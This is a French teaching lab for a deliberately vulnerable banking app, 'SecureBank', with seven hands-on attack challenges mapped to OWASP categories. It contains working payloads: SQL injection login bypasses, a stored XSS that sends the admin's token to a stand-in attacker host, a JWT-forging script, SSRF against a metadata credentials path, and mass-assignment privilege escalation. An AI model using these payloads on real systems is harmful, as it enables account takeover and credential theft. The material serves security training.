# SecureBank · Les défis

Sept attaques réelles sur SecureBank. Pour chacune, vous avez **le Hack**, **la cible dans le code** et **les questions** qui mènent à la correction.

**Le Fix et la preuve sont à vous.** Appliquez la méthode de l'[atelier complet](01-atelier-complet-idor.md) : corrigez, reconstruisez, rejouez l'attaque, vérifiez que l'application fonctionne toujours.

> Prérequis : **[00-installation.md](00-installation.md)** (connexions `loginAlice` et `loginAdmin` dans `securebank.http`). Base propre entre deux défis : `docker compose down -v && docker compose up -d --build`.

| # | Défi | Catégorie OWASP |
|---|---|---|
| 1 | [Le client décide des montants](#défi-1--le-client-décide-des-montants) | A06 · Insecure Design |
| 2 | [Les routes que l'interface ne montre pas](#défi-2--les-routes-que-linterface-ne-montre-pas) | A01 · Broken Access Control |
| 3 | [Un jeton admin forgé](#défi-3--un-jeton-admin-forgé) | A01 · Broken Access Control |
| 4 | [Connexion admin sans mot de passe](#défi-4--connexion-admin-sans-mot-de-passe) | A05 · Injection |
| 5 | [Un message au support qui vole la session de l'admin](#défi-5--un-message-au-support-qui-vole-la-session-de-ladmin) | A05 · Injection (XSS) |
| 6 | [Le serveur lit son réseau interne pour vous](#défi-6--le-serveur-lit-son-réseau-interne-pour-vous) | SSRF |
| 7 | [Devenir ADMIN en modifiant son profil](#défi-7--devenir-admin-en-modifiant-son-profil) | API3 · Mass assignment |

---

## Défi 1 · Le client décide des montants

**A06 · Insecure Design**

### 🔴 Hack
Envoyez un virement à montant négatif, puis un autre à frais négatifs. Le solde d'Alice **augmente**.
```http
### Défi 1 · montant négatif
POST {{api}}/api/transfers
Authorization: Bearer {{loginAlice.response.body.token}}
Content-Type: application/json

{ "fromAccountId": 1, "toIban": "MA64SBNK0000000002", "amount": -500, "memo": "test" }

### Défi 1 · frais négatifs
POST {{api}}/api/transfers
Authorization: Bearer {{loginAlice.response.body.token}}
Content-Type: application/json

{ "fromAccountId": 1, "toIban": "MA64SBNK0000000002", "amount": 100, "fee": -1000, "memo": "test" }

### Vérifier le solde
GET {{api}}/api/me
Authorization: Bearer {{loginAlice.response.body.token}}
```
* **Cible :** `TransferService.transfer` ; côté React, le composant `Transfer` calcule les frais et les **envoie** au serveur.
* **Questions :** Qui doit calculer les frais ? Quelles bornes métier minimales et maximales manquent ? Une contrainte en base pourrait-elle servir de dernier filet ?

---

## Défi 2 · Les routes que l'interface ne montre pas

**A01 · Broken Access Control** (navigation forcée)

### 🔴 Hack
Ces URL n'apparaissent nulle part dans l'interface. Sans **aucun** jeton :
```http
### Défi 2 · la carte de toutes les routes
GET {{api}}/actuator/mappings

### Défi 2 · variables d'environnement
GET {{api}}/actuator/env

### Défi 2 · éteindre l'API — à lancer EN DERNIER
POST {{api}}/actuator/shutdown
```
L'API s'éteint, puis redémarre seule grâce à `restart: unless-stopped` dans `docker-compose.yml`.
* **Cible :** `application.properties` (propriétés `management.*`) et `SecurityConfig`.
* **Questions :** Une URL cachée est-elle une URL protégée ? Quels endpoints d'observabilité faut-il vraiment exposer, et à qui ?

> ⚠️ Faites le **défi 3** avant de corriger celui-ci : il exploite ce que `/actuator/env` laisse fuir.

---

## Défi 3 · Un jeton admin forgé

**A01 · Broken Access Control** (manipulation de jetons)

### 🔴 Hack
1. Récupérez le secret de signature des JWT :
   ```http
   ### Défi 3 · lire le secret JWT
   GET {{api}}/actuator/env/securebank.jwt.secret
   ```
   Si la valeur est de la forme `${JWT_SECRET:…}`, le secret est la partie après les deux-points : la valeur par défaut, écrite en dur.
2. Forgez un jeton au nom de **Bob**, avec le rôle **ADMIN**. Créez `forge_jwt.py` :
   ```python
   import base64, hashlib, hmac, json, time

   secret = b"COLLEZ_ICI_LE_SECRET_LU"

   def enc(d):
       return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=")

   head = enc({"alg": "HS256", "typ": "JWT"})
   body = enc({"sub": "2", "username": "bob", "role": "ADMIN", "exp": int(time.time()) + 3600})
   sig = base64.urlsafe_b64encode(hmac.new(secret, head + b"." + body, hashlib.sha256).digest()).rstrip(b"=")

   print((head + b"." + body + b"." + sig).decode())
   ```
   ```bash
   python forge_jwt.py
   ```
3. Utilisez le jeton :
   ```http
   @forged = COLLEZ_LE_JETON_ICI

   ### Défi 3 · le serveur pense parler à Bob…
   GET {{api}}/api/me
   Authorization: Bearer {{forged}}

   ### Défi 3 · …et à un ADMIN
   GET {{api}}/api/admin/users
   Authorization: Bearer {{forged}}
   ```
* **Cible :** `application.properties` (secret par défaut), `docker-compose.yml` (aucun `JWT_SECRET` fourni), `JwtAuthFilter` (le rôle est lu dans le jeton).
* **Questions :** Où doit vivre le secret ? Un JWT est-il chiffré ? D'où le serveur devrait-il tirer le rôle de l'utilisateur ?

---

## Défi 4 · Connexion admin sans mot de passe

**A05 · Injection** (SQL)

### 🔴 Hack
```http
### Défi 4 · connexion en admin, sans le mot de passe
POST {{api}}/api/auth/login
Content-Type: application/json

{ "username": "admin' --", "password": "peu importe" }
```
La réponse contient un `token` avec `"role":"ADMIN"`.
* **Variantes :** `"' OR '1'='1' --"`, `"' OR role='ADMIN' --"`.
* **Cible :** `AuthController.login` → `UserRepository.findForLogin`.
* **Questions :** Que devient la requête SQL une fois l'identifiant inséré ? Pourquoi `--` fait-il disparaître la vérification du mot de passe ? Où le mot de passe devrait-il être vérifié ?

---

## Défi 5 · Un message au support qui vole la session de l'admin

**A05 · Injection** (XSS stocké)

### 🔴 Hack
Le projet fournit un faux « site de l'attaquant », le service `hackerwebsite`, qui liste les jetons qu'il reçoit.

> **Une seule fois :** ajoutez `127.0.0.1 hackerwebsite` à votre fichier hosts (`/etc/hosts` sous Linux/macOS, `C:\Windows\System32\drivers\etc\hosts` sous Windows).

En tant qu'Alice, envoyez ce message au support :
```http
### Défi 5 · message de support piégé
POST {{api}}/api/support
Authorization: Bearer {{loginAlice.response.body.token}}
Content-Type: application/json

{ "message": "<img src=x onerror=\"fetch('http://hackerwebsite:80/?t='+localStorage.token)\">" }
```
Ouvrez **http://hackerwebsite**. Connectez-vous ensuite au front en **admin** et ouvrez *« Messages support »*. Le jeton de l'admin apparaît chez l'attaquant, avec `role: ADMIN`.
* **Cible :** `SupportController` (stockage), `web/src/App.tsx` (affichage du message), `web/src/api.ts` (où est rangé le jeton).
* **Questions :** Pourquoi le code de l'auteur s'exécute-t-il dans le navigateur de la victime ? Qu'est-ce qu'un jeton lisible par JavaScript rend possible ? Quelles sont les deux lignes de défense ?

---

## Défi 6 · Le serveur lit son réseau interne pour vous

**SSRF · Server-Side Request Forgery**

### 🔴 Hack
L'« import de justificatif » laisse le serveur télécharger l'URL de votre choix. Visez le service interne `metadata`, injoignable depuis votre poste :
```http
### Défi 6 · le serveur lit un service interne à votre place
POST {{api}}/api/kyc/import
Authorization: Bearer {{loginAlice.response.body.token}}
Content-Type: application/json

{ "url": "http://metadata/latest/meta-data/iam/security-credentials/securebank-role" }
```
La réponse contient les « identifiants » du service interne.
* **Cible :** `KycController.importFromUrl`.
* **Questions :** Le serveur peut-il atteindre des ressources que l'utilisateur ne peut pas ? Que vaut une liste noire d'adresses IP face aux redirections et au DNS ?

---

## Défi 7 · Devenir ADMIN en modifiant son profil

**OWASP API Security · API3 Broken Object Property Level Authorization** (mass assignment)

### 🔴 Hack
```http
### Défi 7 · Alice modifie son nom… et son rôle
PUT {{api}}/api/profile
Authorization: Bearer {{loginAlice.response.body.token}}
Content-Type: application/json

{ "fullName": "Alice Benali", "role": "ADMIN" }

### Reconnectez Alice (loginAlice), puis :
GET {{api}}/api/admin/users
Authorization: Bearer {{loginAlice.response.body.token}}
```
Après reconnexion, Alice est `ADMIN`.
* **Cible :** `ProfileController.update`.
* **Questions :** Quels champs un utilisateur a-t-il le droit de modifier sur son propre profil ? Qui en décide, le client ou le serveur ?

---

## 🔒 Et les corrections ?

Les corrections, les preuves et les bonnes pratiques de ces sept défis, ainsi que les **24 autres ateliers**, sont traités dans la **formation complète** : voir la [carte des ateliers](README.md).

Vous avez trouvé une correction élégante ? Partagez-la en commentaire de mes posts **« Hack and Fix en 60 secondes »** sur [LinkedIn](https://www.linkedin.com/in/mohammednasri).
